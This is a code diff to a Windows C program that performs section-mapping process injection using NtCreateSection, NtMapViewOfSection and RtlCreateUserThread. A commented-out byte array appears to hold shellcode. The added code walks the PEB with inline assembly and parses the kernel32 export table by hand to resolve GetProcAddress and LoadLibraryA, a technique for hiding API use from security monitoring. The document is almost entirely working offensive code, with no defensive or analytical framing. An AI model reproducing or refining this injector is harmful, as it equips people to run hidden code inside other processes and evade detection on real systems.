@@ -22,6 +22,27 @@ HMODULE getMod(IN LPCWSTR modName)
     }
 }
 
+PVOID GetProcAddressKernel32(HMODULE hModule, LPCSTR lpProcName)
+{
+    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDOSHeader->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    DWORD *pAddressOfFunctions = (DWORD *)((BYTE *)hModule + pExportDirectory->AddressOfFunctions);
+    DWORD *pAddressOfNames = (DWORD *)((BYTE *)hModule + pExportDirectory->AddressOfNames);
+    WORD *pAddressOfNameOrdinals = (WORD *)((BYTE *)hModule + pExportDirectory->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
+    {
+        char *functionName = (char *)((BYTE *)hModule + pAddressOfNames[i]);
+        if (strcmp(functionName, lpProcName) == 0)
+        {
+            return (PVOID)((BYTE *)hModule + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+        }
+    }
+    return NULL;
+}
+
 int main(int argc, char*argv[]){
 
     /*unsigned char bloom[] =
@@ -59,6 +80,42 @@ int main(int argc, char*argv[]){
     HANDLE targetHandle = NULL;
     HANDLE targetThreadHandle = NULL;
     char *buffer = NULL;
+    PEB* peb;
+    PLDR_DATA_TABLE_ENTRY module;
+    LIST_ENTRY* lEntry;
+    HMODULE k32addr = NULL;
+    GETPROCADDRESS thGetProcAddress = NULL;
+    LOADLIBRARYA thLoadLibraryA = NULL;
+
+    __asm__ volatile(
+        "movq %%gs:0x60, %0"
+        : "=r"(peb) // output
+    );
+
+    lEntry = peb->Ldr->InLoadOrderModuleList.Flink;
+    do
+    {
+        module = CONTAINING_RECORD(lEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+        char baseDllName[256];
+        int i;
+        for (i = 0; i < module->BaseDllName.Length / sizeof(WCHAR) && i < sizeof(baseDllName) - 1; i++)
+        {
+            baseDllName[i] = (char)module->BaseDllName.Buffer[i];
+        }
+        baseDllName[i] = '\0';
+
+        if (_stricmp(baseDllName, "kernel32.dll") == 0)
+        {
+            k32addr = (HMODULE)module->DllBase;
+        }
+        if (_stricmp(baseDllName, "ntdll.dll") == 0)
+        {
+            hNTDLL = (HMODULE)module->DllBase;
+        }
+
+        lEntry = lEntry->Flink;
+    } while (lEntry != &peb->Ldr->InLoadOrderModuleList);
 
     if (argc != 2)
     {
@@ -66,14 +123,19 @@ int main(int argc, char*argv[]){
         return -1;
     }
 
-    hNTDLL = getMod(L"ntdll.dll");
+    thGetProcAddress = (GETPROCADDRESS)GetProcAddressKernel32(k32addr, "GetProcAddress");
+    thLoadLibraryA = (LOADLIBRARYA)GetProcAddressKernel32(k32addr, "LoadLibraryA");
+    HMODULE k32base = thLoadLibraryA("kernel32.dll");
+    HMODULE ntdllBase = thLoadLibraryA("ntdll.dll");
+
+    //hNTDLL = getMod(L"ntdll.dll");
     if (hNTDLL == NULL)
     {
         fprintf(stderr, "[!] Error: getModule(\"ntdll.dll\") failed. Error code: 0x%lx\n", GetLastError());
         return EXIT_FAILURE;
     }
 
-    NtCreateSection thNtCreateSection = (NtCreateSection)GetProcAddress(hNTDLL, "NtCreateSection");
+    NtCreateSection thNtCreateSection = (NtCreateSection)thGetProcAddress(ntdllBase, "NtCreateSection");
     if (thNtCreateSection == NULL)
     {
         fprintf(stderr, "[!] Error: GetProcAddress(\"NtCreateSection\") failed. Error code: 0x%lx\n", GetLastError());
@@ -82,7 +144,7 @@ int main(int argc, char*argv[]){
     }
     printf("[+] Got the address of NtCreateSection from NTDLL: 0x%p\n", thNtCreateSection);
 
-    NtMapViewOfSection thNtMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNTDLL, "NtMapViewOfSection");
+    NtMapViewOfSection thNtMapViewOfSection = (NtMapViewOfSection)thGetProcAddress(ntdllBase, "NtMapViewOfSection");
     if (thNtMapViewOfSection == NULL)
     {
         fprintf(stderr, "[!] Error: GetProcAddress(\"NtMapViewOfSection\") failed. Error code: 0x%lx\n", GetLastError());
@@ -91,7 +153,7 @@ int main(int argc, char*argv[]){
     }
     printf("[+] Got the address of NtMapViewOfSection from NTDLL: 0x%p\n", thNtMapViewOfSection);
 
-    RtlCreateUserThread thRtlCreateUserThread = (RtlCreateUserThread)GetProcAddress(hNTDLL, "RtlCreateUserThread");
+    RtlCreateUserThread thRtlCreateUserThread = (RtlCreateUserThread)thGetProcAddress(ntdllBase, "RtlCreateUserThread");
     if (thRtlCreateUserThread == NULL)
     {
         fprintf(stderr, "[!] Error: GetProcAddress(\"RtlCreateUserThread\") failed. Error code: 0x%lx\n", GetLastError());
